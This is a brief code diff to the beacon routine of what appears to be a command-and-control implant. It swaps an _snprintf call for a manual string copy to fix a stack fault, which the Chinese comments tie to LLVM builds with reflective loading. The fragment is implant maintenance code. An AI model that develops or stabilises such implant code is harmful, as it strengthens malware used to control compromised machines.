@@ -258,7 +258,14 @@ void beacon(LPVOID lpReserved) {
 		post_type = POST_HTTP;
 
 		/* 创建URL */
+#ifdef BW_PLAIN_SLEEP
+		/* LLVM A/B：_snprintf 家族在 LLVM+反射组合下踩栈（见 miniprintf 取证），
+		 * %s 单参场景直接手工拷贝等价替换 */
+		{ char * d_ = post_url; const char * s_ = submit; size_t n_ = 0;
+		  while (*s_ && n_ < 255) { *d_++ = *s_++; n_++; } *d_ = 0; }
+#else
 		_snprintf(post_url, 256, "%s", submit);
+#endif
 
 		bw_diag("pre_http", beacon_cycles);
 		/* 执行协议的HTTP部分 */
